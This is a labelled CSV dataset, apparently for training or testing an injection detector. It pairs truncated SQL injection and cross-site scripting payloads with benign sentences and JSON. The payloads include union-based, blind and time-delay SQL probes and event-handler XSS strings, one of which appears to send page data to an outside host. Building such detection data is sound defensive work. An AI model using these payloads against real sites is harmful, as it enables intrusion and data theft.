Payload,Label,text_label,ID
"1"" ) and row ( 6237,7469 ) > ( select count ( * ) ",2,SQLi,16390
"<object classid=""clsid:02BF25D5-8C17-4B23-BC80-D34",1,XSS,9237
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10785
1' ( select ( case when ( 5451 = 5451 ) then regex,2,SQLi,21744
"<hr draggable=""true"" ondrag=""alert(1)"">test</hr>",1,XSS,7834
select ( case when ( 9388 = 4322 ) then 1 else 938,2,SQLi,17451
"1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a",2,SQLi,14662
1 ) as auly where 4146 = 4146 or elt ( 5873 = 5873,2,SQLi,18285
"<blink oncontextmenu=""alert(1)"">test</blink>",1,XSS,2598
"-9003"" ) ) union all select 9721,9721--",2,SQLi,20378
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4800
"<cite onmouseout=""alert(1)"">test</cite>",1,XSS,4491
-1190' or 4144 = ( select upper ( xmltype ( chr ( ,2,SQLi,16519
"<svg onLoad svg onLoad=""javascript:javascript:aler",1,XSS,378
"<script\x2Ftype=""text/javascript"">javascript:alert",1,XSS,358
-4607'|| ( select 'wkdg' where 7524 = 7524 order b,2,SQLi,12833
1 or exp ( ~ ( select * from ( select concat ( 0x7,2,SQLi,19812
SELECT,0,normal,25691
"<style>@keyframes x{}</style><rb style=""animation-",1,XSS,8727
ORDER BY 22,2,SQLi,10326
"1"" ) and 8407 = ( select count ( * ) from generate",2,SQLi,14084
1' ) or 7417 = ( select count ( * ) from sysibm.sy,2,SQLi,16506
"<bgsound onbeforecopy=""alert(1)"" contenteditable>t",1,XSS,5540
Select the perfect outfit for an event.,0,normal,24140
/><img/onerror=\x20javascript:alert(1)\x20src=xxx:,1,XSS,601
"<legend oncopy=""alert(1)"" contenteditable>test</le",1,XSS,2089
<Z oncut=alert()>x,1,XSS,9060
Select your diversify.,0,normal,25043
"<canvas draggable=""true"" ondrag=""alert(1)"">test</c",1,XSS,7507
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,16741
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,12226
if ( 2697 = 2008 ) select 2697 else drop function ,2,SQLi,17858
"1"" ) ) ) union all select null#",2,SQLi,19499
"<style>@keyframes x{}</style><summary style=""anima",1,XSS,5812
"benchmark(50000000,MD5(1))#",2,SQLi,10387
"1"" ) and 6414 = ( select count ( * ) from rdb$fiel",2,SQLi,15558
<track onblur=alert(1) tabindex=1 id=x></track><in,1,XSS,4355
"<figure ondblclick=""alert(1)"">test</figure>",1,XSS,7147
"<p onmouseenter=""alert(1)"">test</p>",1,XSS,6067
"Then, you'll need to select Download.",0,normal,25337
1'|| ( select 'nfgq' where 1837 = 1837 and char ( ,2,SQLi,20497
"1' in boolean mode ) union all select null,null,nu",2,SQLi,13352
"{""id"":null,""firstName"":""Tony"",""lastName"":""Wang"",""s",0,normal,27234
<ol id=x tabindex=1 onfocusin=alert(1)></ol>,1,XSS,8808
"1"" where 5353 = 5353 and exp ( ~ ( select * from (",2,SQLi,15472
"{""id"":null,""name"":""born""}",0,normal,27013
1' ) ) and 3707 = ( select count ( * ) from sysibm,2,SQLi,17676
"<param onmouseout=""alert(1)"">test</param>",1,XSS,6059
-6125'|| ( select 'hwnm' where 1428 = 1428 union a,2,SQLi,18621
Select the best camera settings for photography.,0,normal,24167
"1"" ) ) as wwqj where 3249 = 3249 and 9254 = ( sele",2,SQLi,16498
"1"" ) or 2367 = ( select count ( * ) from rdb$field",2,SQLi,19635
"-6292 ) union all select 7499,7499,7499,7499,7499,",2,SQLi,13118
"1"" where 8387 = 8387",2,SQLi,20034
"<input type=image src onerror=""prompt(1)"">",1,XSS,9451
<blockquote id=x tabindex=1 onfocus=alert(1)></blo,1,XSS,5388
"{""id"":null,""name"":""needle""}",0,normal,26792
<tbody id=x tabindex=1 ondeactivate=alert(1)></tbo,1,XSS,4321
"<command onbeforecopy=""alert(1)"" contenteditable>t",1,XSS,2654
<svg><head onload=alert(1)></head>,1,XSS,6020
Where's the reflexologist?,0,normal,23647
Where's your SQL knowledge?,0,normal,23378
Retrieve data where available.,0,normal,23266
1' ) where 6248 = 6248 and 2388 = benchmark ( 5000,2,SQLi,21615
"a' or 1 = 1,",2,SQLi,11946
<strike onpointerout=alert(1)>XSS</strike>,1,XSS,6476
"-5652%' ) union all select 4447,4447,4447,4447,444",2,SQLi,17989
"<iframe><img title=""</iframe><img src onerror=aler",1,XSS,114
1' and 8514 = ( select count ( * ) from domain.dom,2,SQLi,12184
"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript",1,XSS,473
"iif ( 7011 = 2522,1,1/0 )",2,SQLi,16631
select case when 6229 = 2077 then 1 else null end-,2,SQLi,12557
1'|| ( select 'sdll' where 5074 = 5074 or ( select,2,SQLi,20484
"1"" procedure analyse ( extractvalue ( 9627,concat ",2,SQLi,16416
<style>@keyframes slidein {}</style><address style,1,XSS,5869
"{""id"":null,""name"":""Cottonee""}",0,normal,27306
1,0,normal,26698
or 'whatever' in ('whatever'),2,SQLi,10122
"select * from users where id = '1' union select ""?",2,SQLi,11614
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;",1,XSS,849
"<q onkeydown=""alert(1)"" contenteditable>test</q>",1,XSS,5052
<thead onpointerdown=alert(1)>XSS</thead>,1,XSS,4574
1'|| ( select 'lije' from dual where 5309 = 5309 a,2,SQLi,13901
"-5292' ) union all select 1439,1439,1439,1439#",2,SQLi,19791
As it would be impossible within the limits of thi,0,normal,26350
<button onpointerdown=alert(1)>XSS</button>,1,XSS,3776
1 ) where 6720 = 6720 or ( select 2* ( if ( ( sele,2,SQLi,20601
Where's the best spot to watch the sunrise?,0,normal,23863
"1"" ) ) and 4386 = utl_inaddr.get_host_address ( ch",2,SQLi,17790
1,0,normal,26706
#ERROR!,2,SQLi,22530
select * from users where id = '1' + $+%\ or 1 = 1,2,SQLi,11608
<video><source onerror=location=/\02.rs/+document.,1,XSS,136
"1"" ) as semi where 4260 = 4260",2,SQLi,16823
1 ) as vzyk where 5103 = 5103 and 8312 = dbms_pipe,2,SQLi,18682
-8069' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( ,2,SQLi,18465
1 ) ) and 4386 = utl_inaddr.get_host_address ( chr,2,SQLi,19394
end and ( ( ( '%' = ',2,SQLi,17380
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,21094
-4373'+ ( select 'rlht' where 2285 = 2285 union al,2,SQLi,12563
